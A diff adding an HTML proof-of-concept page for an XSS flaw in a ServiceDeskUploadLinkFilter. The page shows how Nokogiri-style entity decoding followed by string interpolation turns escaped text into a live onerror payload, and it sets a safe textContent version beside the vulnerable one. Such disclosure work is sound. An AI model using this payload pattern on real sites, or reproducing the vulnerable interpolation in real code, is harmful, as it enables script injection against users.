@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>ServiceDeskUploadLinkFilter Entity Decode XSS PoC</title>
+<style>
+body { font-family: monospace; margin: 2em; background: #1a1a2e; color: #e0e0e0; }
+h1 { color: #ff6b6b; }
+h2 { color: #ffd93d; margin-top: 2em; }
+.box { background: #16213e; border: 1px solid #0f3460; padding: 1em; margin: 1em 0; border-radius: 4px; }
+.safe { border-left: 4px solid #4ecca3; }
+.vuln { border-left: 4px solid #ff6b6b; }
+.label { font-weight: bold; color: #ffd93d; }
+#result { margin-top: 1em; padding: 1em; background: #0f3460; border-radius: 4px; }
+</style>
+</head>
+<body>
+
+<h1>ServiceDeskUploadLinkFilter &mdash; Entity Decode XSS</h1>
+<p>This demonstrates how Nokogiri's <code>.text</code> decodes HTML entities, enabling XSS when the decoded string is interpolated back into HTML.</p>
+
+<h2>1. Simulated Filter (Vulnerable)</h2>
+<div class="box vuln">
+  <div class="label">Input markdown link (after markdown rendering):</div>
+  <code>&lt;a href="/uploads/secret/file.txt"&gt;&amp;lt;img src=x onerror=alert('XSS')&amp;gt;&lt;/a&gt;</code>
+
+  <div class="label" style="margin-top:1em">What the filter does (simulating Nokogiri .text then interpolation):</div>
+  <div id="vuln-output"></div>
+</div>
+
+<h2>2. Safe Version (Using textContent assignment)</h2>
+<div class="box safe">
+  <div class="label">Same input, but using safe DOM construction:</div>
+  <div id="safe-output"></div>
+</div>
+
+<h2>3. Live Demo</h2>
+<div class="box vuln">
+  <div class="label">Click to trigger the vulnerable path:</div>
+  <button onclick="runVuln()" style="padding:0.5em 1em; margin:0.5em 0; cursor:pointer;">Run Vulnerable Code Path</button>
+  <div id="result"></div>
+</div>
+
+<script>
+// --- Simulate the vulnerable filter behavior ---
+
+// This is the <a> tag as it exists in the DOM after SanitizationFilter.
+// The entities &lt; and &gt; are harmless escaped text at this stage.
+const inputHTML = '<a href="/uploads/secret/file.txt">&lt;img src=x onerror=alert(document.domain)&gt;</a>';
+
+// Step 1: Parse it into DOM (like Nokogiri does)
+const parser = new DOMParser();
+const doc = parser.parseFromString(inputHTML, 'text/html');
+const anchor = doc.querySelector('a');
+
+// Step 2 (THE BUG): .textContent decodes entities, just like Nokogiri's .text
+const filename = anchor.textContent;
+// filename is now: <img src=x onerror=alert(document.domain)>
+// The entities have been decoded into real angle brackets!
+
+// Step 3 (THE BUG): Interpolate decoded text back into HTML string
+const vulnerableHTML = `<strong>${filename}</strong>`;
+
+// Show what happens
+document.getElementById('vuln-output').innerHTML =
+  `<code>anchor.textContent = "${filename.replace(/</g,'&lt;').replace(/>/g,'&gt;')}"</code><br>` +
+  `<code>interpolated HTML  = "${vulnerableHTML.replace(/</g,'&lt;').replace(/>/g,'&gt;')}"</code><br>` +
+  `<span style="color:#ff6b6b">^ The decoded entities are now real HTML tags inside the string!</span>`;
+
+// --- Safe version ---
+const strong = document.createElement('strong');
+strong.textContent = filename;  // textContent assignment auto-escapes
+document.getElementById('safe-output').innerHTML = '';
+document.getElementById('safe-output').appendChild(strong);
+
+// --- Live trigger ---
+function runVuln() {
+  const target = document.getElementById('result');
+  // This is exactly what the Ruby filter does:
+  //   Nokogiri::HTML::DocumentFragment.parse("<strong>#{final_filename}</strong>")
+  // In browser terms, this is equivalent to innerHTML assignment:
+  target.innerHTML = '<strong>' + filename + '</strong>';
+}
+</script>
+
+</body>
+</html>
